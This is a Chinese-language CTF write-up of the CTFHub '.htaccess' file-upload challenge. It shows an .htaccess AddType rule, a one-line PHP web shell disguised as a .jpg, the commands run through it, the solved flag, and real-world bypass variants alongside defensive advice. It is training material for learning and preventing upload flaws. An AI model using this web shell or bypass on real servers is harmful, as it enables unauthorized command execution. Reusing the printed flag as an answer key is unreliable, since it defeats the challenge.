CTFHub 文件上传 - .htaccess

2026年9月21日 CTFHub Web安全 文件上传 黑名单绕过

一、题目信息

  • 题目名称：文件上传 - .htaccess
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / 文件上传漏洞 / 服务器配置解析绕过
  • 靶场链接：http://challenge-630f5c90b0b658eb.sandbox.ctfhub.com:10800（动态环境）
  • 涉及工具：Chrome浏览器、开发者工具（F12）、macOS访达（显示隐藏文件）、Base64在线解码工具

二、解题步骤

1. 分析题目考什么

本题的核心考点是利用 Apache 服务器的 .htaccess 文件实施“黑名单绕过”。题目环境在服务器端配置了黑名单，直接上传 .php 文件会被拦截或无法解析。解题思路转变为“曲线救国”：先上传一个 .htaccess 配置文件，主动修改 Apache 的解析规则，将普通的图片后缀（如 .jpg）强制当作 PHP 脚本执行，随后上传伪装成图片的木马，绕过黑名单实现 RCE。

2. 怎么想（破题思路）

  • 尝试直接上传 shell.php，发现被拦截或失效。这表明服务器采用了黑名单机制。
  • 黑名单绕过有大小写、双写、特殊后缀等多种方式，但此题提示了 .htaccess，这是一种更高级的服务器配置漏洞利用。
  • 思路：先传 .htaccess（文件内容：告诉 Apache 把 .jpg 当作 PHP 执行） -> 再传 shell.jpg（文件内容：真正的 PHP 木马） -> 访问 shell.jpg，PHP 代码被触发。
  • 由于是黑盒测试，盲猜路径和传参方式常常导致失败，需要通过报错信息或抓包来修正路径。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：macOS 系统默认隐藏 .htaccess 文件

踩坑情况：在 Mac 访达中创建了 `.htaccess` 文件，但在网页的上传文件选择框中死活找不到它，导致无法上传。

原因分析：类 Unix 系统（包括 macOS）默认将以点（`.`）开头的文件视为隐藏文件，文件选择器不会直接展示。

改进方式：在文件选择弹窗中，按下快捷键 Command + Shift + .（句号），即可切换显示隐藏文件，此时 `.htaccess` 就会出现并可选中。

踩坑记录二：上传顺序错误导致解析失败

踩坑情况：先传了 `shell.jpg`，再传 `.htaccess`，结果访问 `shell.jpg` 时依然无法执行 PHP 代码。

原因分析：`.htaccess` 文件的作用是配置当前目录的规则。必须先让服务器接收并应用这个规则，随后上传的 `.jpg` 文件才会在这个规则下被解析。

改进方式：必须严格遵循“先传配置，后传木马”的顺序。先传 `.htaccess`，确认成功后再传 `shell.jpg`。

踩坑记录三：cat 读取 PHP 文件导致空白

踩坑情况：在寻找 Flag 时，使用 cat 命令读取 flag_xxxx.php，没有报错，但页面不显示内容。

原因分析：Flag 文件的内容是 <?php // ctfhub{xxxx} ?>。当 Web 服务器解析这个 PHP 文件时，<?php 和 ?> 之间的内容被当作 PHP 代码处理。而 // 是 PHP 的单行注释符，后面的 Flag 内容被当作注释，不会输出给浏览器，因此我们看不到。

改进方式：使用 base64 命令将文件内容进行编码输出。Base64 编码后的字符串不再包含 <?php 等特殊字符，服务器就不会去解析它。

详细实操步骤

第一步：构造“规则书” .htaccess

在本地新建文件 .htaccess，写入以下代码：

AddType application/x-httpd-php .jpg

代码逐字深度解析：

  • AddType：Apache 服务器的配置指令，用于将特定的文件扩展名映射到特定的 MIME 类型。
  • application/x-httpd-php：这是一个 MIME 类型标识，告诉服务器将这个类型的文件交给 PHP 解析器去处理。
  • .jpg：指定要被特殊对待的文件扩展名。合起来的意思是：只要看到后缀是 .jpg 的文件，就把它当作 PHP 脚本来执行。

第二步：构造伪装木马 shell.jpg

在本地新建文件 shell.jpg，写入以下代码：

<?php system($_GET['cmd']); ?>

代码逐字深度解析：

  • <?php：PHP 脚本的起始标记，告诉 Web 服务器从这里开始按 PHP 代码解析。
  • system：PHP 的内置函数，用于执行外部系统命令，并直接输出执行结果。
  • ( )：函数参数括号，里面的内容会作为命令传给 system 执行。
  • $_GET：PHP 超全局变量，用于接收 HTTP GET 请求中 URL 参数的数据。
  • [ 'cmd' ]：数组下标。表示提取 URL 中名为 cmd 的参数值。例如 URL 为 ?cmd=ls，则 $_GET['cmd'] 的值就是 ls。
  • ;：PHP 语句结束符。
  • ?>：PHP 脚本的结束标记。

第三步：禁用 JS 并依次上传

为了防止本题存在前端 JS 校验，我们先按下 F12，在 Settings -> Preferences -> Debugger 中勾选 Disable JavaScript。随后在页面上先上传 .htaccess，提示成功后，再上传 shell.jpg。页面会回显路径：upload/shell.jpg。

第四步：寻找 Flag 文件

在浏览器访问：http://.../upload/shell.jpg?cmd=ls ../

页面回显发现可疑文件：flag_3231421113.php。

第五步：Base64 读取并解码

直接访问 .../upload/shell.jpg?cmd=cat ../flag_3231421113.php 会返回空白页（原因见上方踩坑记录）。因此改用 Base64 命令读取：

http://.../upload/shell.jpg?cmd=base64 ../flag_3231421113.php

页面回显 Base64 字符串（如 PD9waHAgLy8gY3RmaHVi...）。复制该字符串，在在线 Base64 解码网站解码，得到 Flag：ctfhub{cb6e8ca5b2c6ca2ff5a40078}。

4. 怎么迁移（跨领域联想）

  • 真实渗透测试：在实战中，遇到黑名单机制时，上传 .htaccess 或 .user.ini 是经典的绕过手法。如果目标中间件是 Nginx，则可能利用 Nginx 的解析漏洞（如 shell.jpg/x.php）。此外，还可以尝试构造 php3、phtml、php5 等特殊后缀绕过。
  • 安全开发（SDL）：开发人员应当明确，文件上传的安全校验绝不能仅仅依靠简单的“黑名单”。应该采用“白名单”机制（只允许上传特定的安全后缀），并对上传文件进行重命名（如替换为时间戳+随机字符串），剥离其执行权限，甚至将文件存储在专门的静态资源服务器上。
  • 代码审计：审计 PHP 代码时，若发现使用 move_uploaded_file 移动文件，且没有对后缀名做白名单限制，或者没有禁止上传 .htaccess 文件，就可以判定存在此类漏洞。

三、名词大全与原理深度复盘

1. .htaccess 文件

.htaccess（Hypertext Access）是 Apache 服务器特有的分布式配置文件。它允许在网站根目录或子目录下放置，用于对当前目录下的网页进行配置。它无需重启服务器即可生效。常见的功能包括：网页重定向、自定义错误页面、改变文件扩展名解析、访问控制等。本次解题利用的正是“改变文件扩展名解析”这一功能。

2. Apache 解析机制与 AddType 指令

Apache 本身并不认识 PHP 代码，它需要依靠配置文件将特定的文件后缀（如 .php）与 PHP 解析器（php-cgi 或 php-fpm）进行绑定。AddType 指令的作用就是建立这种 MIME 类型映射。一旦我们在 .htaccess 中写了 `AddType application/x-httpd-php .jpg`，Apache 就会在接收到 `.jpg` 文件的请求时，将文件内容交由 PHP 解析器执行，从而绕过黑名单。

3. 黑名单与白名单的底层逻辑区别

黑名单机制（禁止上传 .php, .asp 等）存在天然的缺陷，因为存在无穷无尽的后缀变体和配置绕过方式，攻击者总能找到漏网之鱼。而白名单机制（只允许上传 .jpg, .png, .gif）从根本上杜绝了非图片文件的执行，是防御文件上传漏洞的终极解决方案。本题的漏洞底层逻辑，就是开发者未能防御住 .htaccess 这一服务器配置层面的攻击。

4. 为什么 cat 读 PHP 文件会空白，而 base64 可以？

PHP 解析器在执行文件时，会寻找 <?php 和 ?> 标记。标记之外的 HTML 内容会原样输出，标记之内的 PHP 代码会被执行。Flag 被写在 // 注释中，注释在 PHP 代码中是不参与输出的。而 base64 命令是 Linux 层面的文件读取命令，它不经过 PHP 解析器，直接将文件在磁盘上的原始二进制数据编码输出。因此，base64 可以完美绕过 PHP 解析机制，将包含 PHP 标签的原始文本完整地展示出来。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与“无限制”的区别：“无限制”是彻底不设防，直接传 `.php` 就能执行；本题属于黑名单防御，需要攻击者利用服务器配置层面的漏洞进行绕过。
  • 与“js前端验证”的区别：前端验证属于客户端防御，禁用 JS 即可绕过；本题的防御位于服务器端，直接禁用 JS 无法绕过，必须采用上传 `.htaccess` 的巧妙策略。
  • 与“文件包含漏洞”的区别：文件包含是服务器提供了“执行器”，去执行已有的恶意文件；而文件上传是直接植入恶意文件。本题的 `.htaccess` 玩法，本质上是“借用服务器的解析功能”来执行我们自己上传的木马。

2. 这种题目的出现原因

这类漏洞的存在，往往源于开发人员的安全认知盲区。开发人员以为拦截了 `php` 后缀（黑名单），网站就固若金汤了。但实际上，他们忽略了 Apache 服务器的 `.htaccess` 文件本身可以被用户上传。如果上传目录不仅允许上传图片，还允许上传 `.htaccess` 文件，攻击者就可以直接篡改服务器的解析规则。真实的 Web 服务器配置缺陷比代码漏洞往往更致命。

3. 这种应用在实际中如何体现？

在渗透测试中，如果发现目标网站是 Apache 环境，且上传功能对后缀名做了严格的过滤，测试人员通常会尝试以下组合拳：

  • 上传 .htaccess 文件，添加 AddType application/x-httpd-php .png 或 SetHandler application/x-httpd-php。
  • 上传一个带有 PHP 代码的 shell.png 文件，成功触发执行。
  • 如果是 Nginx 环境，还可以尝试上传 .user.ini 文件来设置 auto_prepend_file。

4. 如何抽象理解概念（大白话理解）

把网站服务器比作一家酒吧：

  • 黑名单（服务器防御）：酒吧保安手里拿着一张禁品清单，上面写着“禁止携带刀具（.php）入场”。
  • 上传木马（攻击者）：攻击者手里拿着一把刀（PHP木马），强行闯关会被拦下。于是攻击者把刀藏在了一个蛋糕（.jpg）里，因为保安不查蛋糕。
  • 上传 .htaccess（核心解法）：攻击者提前潜入酒吧，把一张纸条贴在了保安的桌子上，上面写着：“从今天起，所有带蛋糕（.jpg）的人，都按照带刀具（.php）来对待”。
  • 结果：攻击者拿着藏有刀的蛋糕进场，保安看到纸条，乖乖把蛋糕当成刀来处理，酒吧防线彻底崩溃。

做一道题，就要往自己脑子里装点东西。
